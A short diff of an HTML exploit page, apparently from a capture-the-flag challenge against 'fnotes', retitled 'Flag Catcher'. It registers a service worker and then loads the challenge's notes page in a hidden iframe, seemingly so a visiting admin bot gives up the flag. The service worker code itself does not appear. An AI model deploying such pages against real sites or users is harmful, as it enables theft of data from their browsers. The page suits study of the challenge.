@@ -1,16 +1,17 @@
 <!DOCTYPE html>
 <html>
-  <head><title>load notes</title></head>
-  <body>
-    <script>
-      navigator.serviceWorker.register("/sw.js").then(() => {
-        setTimeout(() => {
-          const iframe = document.createElement("iframe");
-          iframe.src = "https://fnotes-web.ctf-chal.idek.team/notes/";
-          document.body.appendChild(iframe);
-        }, 1000);
-      });
-    </script>
-    <h1>Waiting...</h1>
-  </body>
+<head><title>Flag Catcher</title></head>
+<body>
+  <h1>Waiting for bot...</h1>
+  <script>
+    navigator.serviceWorker.register("/sw.js").then(() => {
+      setTimeout(() => {
+        let iframe = document.createElement("iframe");
+        iframe.src = "https://fnotes-web.ctf-chal.idek.team/notes/";
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+      }, 500); // Slight delay before iframe loads
+    });
+  </script>
+</body>
 </html>
